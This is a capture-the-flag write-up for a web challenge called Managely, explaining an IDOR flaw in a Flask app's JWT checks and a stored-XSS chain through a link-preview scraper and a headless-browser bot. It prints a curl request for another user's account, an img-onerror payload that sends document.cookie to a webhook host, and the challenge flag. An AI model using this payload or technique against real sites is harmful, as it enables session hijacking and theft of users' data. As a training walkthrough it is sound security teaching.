---
title: "BesidesALG 2025 — Managely"
date: 2025-09-01
tags: [web, xss, jwt, ssrf, besidesalg]
ctf: "BesidesALG 2025"
summary: "Flask app with JWT auth, a headless-browser bot, and a link checker. Two-part flag: IDOR via JWT claim manipulation for part 1, stored XSS through the bot for part 2."
draft: false
---

**Stack:** Flask + SQLAlchemy + JWT + Selenium (headless Chrome)
**Flag:** `shellmates{COngRats_Y0U_muSt_be_4_GOOOO0D_HACkER_HuUuuh?_world_record_egg}`

---

## Overview

We're handed source for a Flask app called **Managely** — looks like an internal admin dashboard for a marketing agency. Templates (`index.html`, `register.html`, `dashboard.html`), a `User`/`Account`/`Company` model set, JWT-based auth, a link checker, and a "social media bot" that drives a headless browser. Two flags are stitched into the source as environment variables:

```python
FLAG_PART_1 = ... # seeded as Account("John_Doe").bio
FLAG_PART_2 = ... # TEST_ACCOUNT, used inside /social_media_bot
```

Two flags, two completely different attack surfaces. Let's break them both.

---

## Part 1: Flag via JWT Claim Manipulation (IDOR)

### Recon

After registering and logging in, the JWT payload looks like:

```json
{"user_id": 3, "company_id": 1, "exp": ...}
```

The `/api/account/<id>` endpoint checks `company_id` from the JWT — but not whether `user_id` matches the requested account. Classic horizontal privilege escalation.

### Vulnerability

The endpoint retrieves an account by the URL `id`, then only validates that the account's `company_id` matches the JWT's `company_id`. It never checks that `user_id == id`.

John Doe's account (which holds FLAG_PART_1 in `.bio`) has `user_id: 1` and `company_id: 1`.

### Exploitation

1. Register a new account — you get `company_id: 1` (same default company)
2. Forge a JWT with your own secret? No — but you don't need to. Just request `/api/account/1` with your valid token. The `company_id` check passes (both are 1), and you get John Doe's bio.

```bash
curl -H "Authorization: Bearer <your_jwt>" http://target/api/account/1
# Returns John_Doe's bio = FLAG_PART_1
```

---

## Part 2: Flag via Stored XSS through the Social Media Bot

### The Bot

`/social_media_bot` accepts a URL, drives a headless Chrome to visit it, logged in as `TEST_ACCOUNT`. That account's profile contains FLAG_PART_2.

### Vulnerability

The link checker at `/check_link` fetches the URL you submit and renders a preview. The title and description from the fetched page are stored in the database and later rendered **without escaping** on the dashboard.

### Exploitation Chain

1. Host an HTML page with a malicious `<title>`:
   ```html
   <title><img src=x onerror="fetch('https://webhook/'+document.cookie)"></title>
   ```
2. Submit this URL to `/check_link` — it gets scraped and stored as a link preview
3. Submit your profile URL to `/social_media_bot`
4. Bot visits your profile, sees the stored XSS payload in the link preview, executes it
5. Bot's session cookie arrives at your webhook — use it to read TEST_ACCOUNT's profile → FLAG_PART_2

## Lessons Learned

- JWT `company_id` checks without `user_id` validation = IDOR
- Link preview scrapers that store raw HTML metadata are stored XSS sinks
- Always enumerate what data the bot's session can access before deciding on the exfil payload
